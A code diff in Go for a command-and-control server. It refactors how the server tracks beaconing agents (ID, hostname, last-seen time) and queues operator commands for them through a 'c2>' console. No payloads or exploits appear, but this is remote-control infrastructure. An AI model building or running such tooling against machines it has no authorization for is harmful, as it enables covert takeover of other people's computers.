@@ -11,12 +11,13 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"time"
 )
 
 var (
-	tasks = make(map[string][]string)
-	mu    sync.Mutex
-	wg    sync.WaitGroup
+	agents = make(map[string]*models.Agent)
+	mu     sync.Mutex
+	wg     sync.WaitGroup
 )
 
 func beaconHandler(w http.ResponseWriter, r *http.Request) {
@@ -31,11 +32,19 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	fmt.Println("[client] ---> ID => " + req.ID)
-
 	mu.Lock()
 	defer mu.Unlock()
-	sendTask(w, req)
+	agent, exists := agents[req.ID]
+	if !exists {
+		agent = &models.Agent{
+			ID:       req.ID,
+			Hostname: req.Hostname,
+		}
+		agents[req.ID] = agent
+	}
+	agent.LastSeen = time.Now()
+
+	sendTask(w, agent)
 
 }
 
@@ -54,7 +63,13 @@ func taskHandler(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	defer mu.Unlock()
 
-	tasks[req.ID] = append(tasks[req.ID], req.Command)
+	agent, exists := agents[req.ID]
+	if !exists {
+		agent = &models.Agent{ID: req.ID, LastSeen: time.Now()}
+		agents[req.ID] = agent
+	}
+	agent.Tasks = append(agent.Tasks, req.Command)
+
 	json.NewEncoder(w).Encode(map[string]string{"status": "task queued"})
 }
 
@@ -85,16 +100,15 @@ func decodeBeacon(r *http.Request) (models.NewBeacon, error) {
 	return req, nil
 }
 
-func sendTask(w http.ResponseWriter, b models.NewBeacon) {
+func sendTask(w http.ResponseWriter, a *models.Agent) {
 	var newTask models.NewTask
 
-	if len(tasks[b.ID]) > 0 {
-		task := tasks[b.ID][0]
-		tasks[b.ID] = tasks[b.ID][1:]
-		newTask.ID = b.ID
-		newTask.Command = task
+	if len(a.Tasks) > 0 {
+		newTask.ID = a.ID
+		newTask.Command = a.Tasks[0]
+		a.Tasks = a.Tasks[1:]
 	} else {
-		newTask.ID = b.ID
+		newTask.ID = a.ID
 		newTask.Command = ""
 	}
 	json.NewEncoder(w).Encode(newTask)
@@ -107,8 +121,12 @@ func addTask() {
 	fmt.Print("command -> ")
 	var command string
 	fmt.Scanln(&command)
-	tasks[id] = append(tasks[id], command)
-	fmt.Println("Task added")
+	agent, exists := agents[id]
+	if !exists {
+		agent = &models.Agent{ID: id, LastSeen: time.Now()}
+		agents[id] = agent
+	}
+	agent.Tasks = append(agent.Tasks, command)
 }
 
 func printBanner() {
@@ -156,30 +174,38 @@ func cli() {
 		fmt.Print("c2> ")
 		var cmd string
 		fmt.Scanln(&cmd)
-		flushTerminal()
 		printBanner()
 		switch cmd {
 		case "help":
+			flushTerminal()
 			printHelp()
 		case "agents":
+			flushTerminal()
 			mu.Lock()
 			fmt.Println("Agents:")
-			for id := range tasks {
-				fmt.Println(" -", id)
+			for _, a := range agents {
+				fmt.Printf(" - ID: %s Hostname: %s  last seen: %s\n", a.ID, a.Hostname, a.LastSeen.Format(time.RFC822))
 			}
 			mu.Unlock()
 		case "tasks":
+			flushTerminal()
 			mu.Lock()
 			fmt.Println("Queued tasks:")
-			for id, tlist := range tasks {
-				fmt.Printf("Agent %s -> %v\n", id, strings.Join(tlist, ","))
+			for id, agent := range agents {
+				if len(agent.Tasks) > 0 {
+					fmt.Printf("Agent %s -> %s\n", id, strings.Join(agent.Tasks, ", "))
+				} else {
+					fmt.Printf("Agent %s -> (no tasks)\n", id)
+				}
 			}
 			mu.Unlock()
 		case "add":
+			flushTerminal()
 			mu.Lock()
 			addTask()
 			mu.Unlock()
 		case "exit":
+			flushTerminal()
 			fmt.Println("Shutting down...")
 			os.Exit(0)
 		case "":
